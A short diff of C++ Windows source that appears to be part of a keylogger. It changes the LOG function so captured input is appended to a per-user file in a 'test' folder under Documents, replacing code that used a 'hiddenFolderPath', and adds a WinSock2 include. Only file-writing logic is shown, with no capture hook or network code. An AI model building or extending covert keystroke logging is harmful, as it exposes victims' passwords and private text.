@@ -8,6 +8,7 @@
 #include <string.h>
 #include <fstream>
 #include <map>
+#include <WinSock2.h>
 
 using namespace std;
 
@@ -19,24 +20,21 @@ char* GetUser() {
 void LOG(string input) {
     string username = GetUser();
     string filename = username + ".txt";
-    fstream LogFile(filename, fstream::app);
+    //fstream LogFile(filename, fstream::app);
+
+    char saveLocation[MAX_PATH] = {0};
+
+    SHGetSpecialFolderPath(NULL, saveLocation, CSIDL_PERSONAL, FALSE);
+
+    string TestDirectory = strcat(saveLocation, "\\test");
+
+    //string Log = TestDirectory + "\\" + filename;
+    fstream LogFile(TestDirectory + "\\" + filename, fstream::app);
     if (LogFile.is_open()) {
         LogFile << input;
         LogFile.close();
     }
-
-    PWSTR documentsPath = nullptr;
-    SHGetKnownFolderPath(FOLDERID_Documents, KF_FLAG_DEFAULT, nullptr, &documentsPath);
-    std::wstring hiddenFolderPath(std::wstring(documentsPath) + L"\\test");
-
-    string hiddenFilePath = string(hiddenFolderPath.begin(), hiddenFolderPath.end()) + "\\" + filename;
-    //string hiddenFilePath = hiddenFolderPath + "\\" + filename;
-    fstream hiddenLogFile(hiddenFilePath, fstream::app);
-    if (hiddenLogFile.is_open()) {
-        hiddenLogFile << input;
-        hiddenLogFile.close();
-    }
-}
+} 
 
 // voegt speciale toetsen toe aan een map
 bool SpecialKeys(int S_Key) {
